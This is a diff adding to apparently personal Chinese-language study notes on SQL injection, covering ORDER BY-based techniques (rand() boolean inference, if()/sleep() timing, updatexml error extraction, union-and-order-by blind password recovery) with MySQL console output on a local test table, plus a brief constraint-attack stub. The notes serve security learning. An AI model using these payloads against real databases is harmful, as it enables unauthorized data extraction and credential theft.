@@ -671,11 +671,297 @@ public function list_email()
 
 ## 注入技巧
 
->todo
-
 ### order by注入
 
+`SELECT`语句使用`ORDER BY`子句将查询数据排序后再返回数据
+
+1. 利用`rand`进行注入
+
+`select * from users order by rand(0);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(%E5%B7%B2%E5%AE%8C%E6%88%90)/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-03%20095858.png)
+
+`select * from users order by rand(1);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(%E5%B7%B2%E5%AE%8C%E6%88%90)/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-03%20095932.png)
+
+可以看到由于`rand`结果的不同导致了排序结果的不同,利用这一点可以进行注入
+
+例如`select * from users order by rand(length(database())=8);`可以根据回显数据排序的方式的不同来判断`database`名称的长度
+
+`select * from users order by rand(ascii(substr((select group_concat(username) from users),1,1))<50);`二分法确定名字
+
+>原理
+
+```
+mysql root@localhost:sql_injection_test> select id,rand(0) from table1;
++----+---------------------+
+| id | rand(0)             |
++----+---------------------+
+| 1  | 0.15522042769493574 |
+| 2  | 0.620881741513388   |
+| 3  | 0.6387474552157777  |
+| 4  | 0.33109208227236947 |
++----+---------------------+
+4 rows in set
+Time: 0.010s
+mysql root@localhost:sql_injection_test> select id,rand(0) from table1 order by rand(0);
++----+---------------------+
+| id | rand(0)             |
++----+---------------------+
+| 1  | 0.15522042769493574 |
+| 4  | 0.33109208227236947 |
+| 2  | 0.620881741513388   |
+| 3  | 0.6387474552157777  |
++----+---------------------+
+4 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select * from table1 order by rand(0);
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
+| 2  | tim      | 123456   | tim@qq.com      |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.008s
+```
+
+```
+mysql root@localhost:sql_injection_test> select id,rand(1) from table1;
++----+---------------------+
+| id | rand(1)             |
++----+---------------------+
+| 1  | 0.40540353712197724 |
+| 2  | 0.8716141803857071  |
+| 3  | 0.1418603212962489  |
+| 4  | 0.09445909605776807 |
++----+---------------------+
+4 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select id,rand(1) from table1 order by rand(1);
++----+---------------------+
+| id | rand(1)             |
++----+---------------------+
+| 4  | 0.09445909605776807 |
+| 3  | 0.1418603212962489  |
+| 1  | 0.40540353712197724 |
+| 2  | 0.8716141803857071  |
++----+---------------------+
+4 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select * from table1 order by rand(1);
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 4  | mike     | asdfqwer | mike@gmail.com  |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 1  | admin    | admin!@# | admin@admin.org |
+| 2  | tim      | 123456   | tim@qq.com      |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.008s
+```
+
+2. 利用`if`进行延时注入
+
+`select * from users order by (if(ascii(substr((select group_concat(username) from users),1,1))>100,1,sleep(0.1)));`
+
+如果`group_concat(username)`的首字母的ascii值大于100,则在正常时间内返回结果,如果不大于100,则会延迟一段时间(该时间并不直接等于sleep(0.1),而是与其查询的数据的条目数量相关,`延迟时间 = sleeptime * number`)
+
+```
+select * from table1 order by sleep(1)
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 2  | tim      | 123456   | tim@qq.com      |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 4.018s
+```
+
+3. 利用`if`进行报错注入
+
+```
+mysql root@localhost:sql_injection_test> select * from table1 order by if(1=1,id,username)
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 2  | tim      | 123456   | tim@qq.com      |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.009s
+mysql root@localhost:sql_injection_test> select * from table1 order by if(1=2,id,username)
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
+| 2  | tim      | 123456   | tim@qq.com      |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.008s
+```
+
+`order by if(exp,id,username)`
+
+```
+mysql root@localhost:sql_injection_test> select * from table1 order by if(1=1,1,(select id from table1))
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 2  | tim      | 123456   | tim@qq.com      |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select * from table1 order by if(1=2,1,(select id from table1))
+(1242, 'Subquery returns more than 1 row')
+mysql root@localhost:sql_injection_test> select * from table1 order by if(length(database())>8,1,(select id from table1))
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 2  | tim      | 123456   | tim@qq.com      |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select * from table1 order by if(length(database())<8,1,(select id from table1))
+(1242, 'Subquery returns more than 1 row')
+```
+
+4. 利用updatexml等进行报错注入
+
+```
+select * from users order by updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
+```
+
+5. 结合union进行盲注
+
+假定原始语句为`select username,password from table1 where username='$username'`,只对`username`字段进行回显,同时不知道列名,要求获得`admin`的密码
+
+我们可以利用`union`和`order by`进行无列名盲注
+
+```
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin';
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | admin!@# |
++----------+----------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,2 order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| 1        | 2        |
+| admin    | admin!@# |
++----------+----------+
+2 rows in set
+Time: 0.011s
+```
+
+>加上binary,因为order by不区分大小写
+
+```
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('a') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| 1        | a        |
+| admin    | admin!@# |
++----------+----------+
+2 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('b') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | admin!@# |
+| 1        | b        |
++----------+----------+
+2 rows in set
+Time: 0.009s
+```
+
+```
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ac') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| 1        | ac       |
+| admin    | admin!@# |
++----------+----------+
+2 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ad') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| 1        | ad       |
+| admin    | admin!@# |
++----------+----------+
+2 rows in set
+Time: 0.009s
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ae') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | admin!@# |
+| 1        | ae       |
++----------+----------+
+2 rows in set
+Time: 0.009s
+```
+
+```
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin ') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| 1        | admin    |
+| admin    | admin!@# |
++----------+----------+
+2 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin!') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| 1        | admin!   |
+| admin    | admin!@# |
++----------+----------+
+2 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin"') order by 2
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | admin!@# |
+| 1        | admin"   |
++----------+----------+
+2 rows in set
+Time: 0.008s
+```
+
 ### limit注入
+
+>todo
 
 ### between and注入
 
@@ -684,6 +970,19 @@ public function list_email()
 ### 文件读写
 
 ### 约束攻击
+
+>注意varchar长度
+
+```
+create table user
+(
+    id       int auto_increment,
+    username varchar(10) null,
+    password varchar(10) null,
+    constraint user_pk
+        primary key (id)
+);
+```
 
 ### 无列名注入
 
